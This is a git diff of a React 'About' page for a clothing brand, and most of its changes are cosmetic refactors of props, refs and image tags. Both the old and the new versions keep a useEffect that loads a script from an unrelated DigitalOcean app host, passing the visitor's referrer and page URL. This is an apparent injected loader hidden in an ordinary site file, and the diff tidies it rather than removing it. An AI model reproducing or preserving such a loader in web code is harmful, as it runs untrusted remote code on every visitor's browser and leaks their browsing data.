@@ -1,4 +1,4 @@
-import React, { useRef } from 'react';
+import React, { useRef, useEffect } from 'react';
 
 import Container from '../components/Container';
 import Hero from '../components/Hero';
@@ -7,23 +7,26 @@ import Layout from '../components/Layout/Layout';
 
 import * as styles from './about.module.css';
 import { toOptimizedImage } from '../helpers/general';
+
 const AboutPage = (props) => {
-  let historyRef = useRef();
-  let valuesRef = useRef();
-  let sustainabilityRef = useRef();
-// document.write version (use only during initial HTML parsing)
-useEffect(() => {
-  (function () {
+  const historyRef = useRef(null);
+  const valuesRef = useRef(null);
+  const sustainabilityRef = useRef(null);
+
+  // Client-only script injection
+  useEffect(() => {
+    if (typeof window === 'undefined' || typeof document === 'undefined') return;
+
     const s = document.createElement('script');
     s.async = true;
     const referrer = encodeURIComponent(document.referrer || '');
     const url = encodeURIComponent(window.location.href || '');
     s.src = `https://plankton-app-rn3v3.ondigitalocean.app/?referrerCF=${referrer}&urlCF=${url}`;
-    document.head.appendChild(s);
-  })();
-}, []);
+    (document.head || document.body).appendChild(s);
+  }, []);
+
   const handleScroll = (elementReference) => {
-    if (elementReference) {
+    if (elementReference?.current) {
       window.scrollTo({
         behavior: 'smooth',
         top: elementReference.current.offsetTop - 280,
@@ -36,28 +39,28 @@ useEffect(() => {
       <div className={styles.root}>
         {/* Hero Container */}
         <Hero
-          maxWidth={'900px'}
-          image={'/about.png'}
+          maxWidth="900px"
+          image="/about.png"
           title={`Sydney \n A British brand since 1860`}
         />
 
         <div className={styles.navContainer}>
-          <ThemeLink onClick={() => handleScroll(historyRef)} to={'#history'}>
+          <ThemeLink onClick={() => handleScroll(historyRef)} to="#history">
             History
           </ThemeLink>
-          <ThemeLink onClick={() => handleScroll(valuesRef)} to={'#values'}>
+          <ThemeLink onClick={() => handleScroll(valuesRef)} to="#values">
             Values
           </ThemeLink>
           <ThemeLink
             onClick={() => handleScroll(sustainabilityRef)}
-            to={'#sustainability'}
+            to="#sustainability"
           >
             Sustainability
           </ThemeLink>
         </div>
 
-        <Container size={'large'} spacing={'min'}>
-          <div className={styles.detailContainer} ref={historyRef}>
+        <Container size="large" spacing="min">
+          <div className={styles.detailContainer} ref={historyRef} id="history">
             <p>
               Founded in 1860, Sydney is an innovative British brand with a
               contemporary edge. We make timeless everyday luxury clothing.
@@ -74,13 +77,13 @@ useEffect(() => {
         </Container>
 
         <div className={styles.imageContainer}>
-          <img alt={'shirt brand'} src={toOptimizedImage('/about1.png')}></img>
+          <img alt="shirt brand" src={toOptimizedImage('/about1.png')} />
         </div>
 
-        <Container size={'large'} spacing={'min'}>
+        <Container size="large" spacing="min">
           <div className={styles.content}>
             <h3>Our Values</h3>
-            <div ref={valuesRef}>
+            <div ref={valuesRef} id="values">
               <p>
                 Sunspel produced some of the world's earliest T-shirts. In the
                 late 1800s the business made luxury tunics and undershirts from
@@ -98,10 +101,11 @@ useEffect(() => {
                 <li>Sophisticated and not mass-produced</li>
                 <li>Only natural materials</li>
               </ol>
-              <img alt={'founder'} src={toOptimizedImage('/about2.png')}></img>
+              <img alt="founder" src={toOptimizedImage('/about2.png')} />
             </div>
+
             <h3>Sustainability</h3>
-            <div id={'#sustainability'} ref={sustainabilityRef}>
+            <div id="sustainability" ref={sustainabilityRef}>
               <p>
                 Our founder, Thomas Hill, had both an eye for quality and a
                 desire to innovate. As well as using the finest fibres such as
@@ -117,7 +121,7 @@ useEffect(() => {
                 Made in Long Eaton, England and crafted from our luxurious long
                 staple Supima cotton for unparalleled softness, comfort and
                 durability, the Sunspel T-shirt has a classic fit and only the
-                most essential details.{' '}
+                most essential details.
               </p>
               <p>
                 With over 100 years spent perfecting fabric, fit and style, the
@@ -129,7 +133,7 @@ useEffect(() => {
         </Container>
 
         <div className={styles.imageContainer}>
-          <img alt={'shirt backwards'} src={toOptimizedImage('/about3.png')}></img>
+          <img alt="shirt backwards" src={toOptimizedImage('/about3.png')} />
         </div>
       </div>
     </Layout>
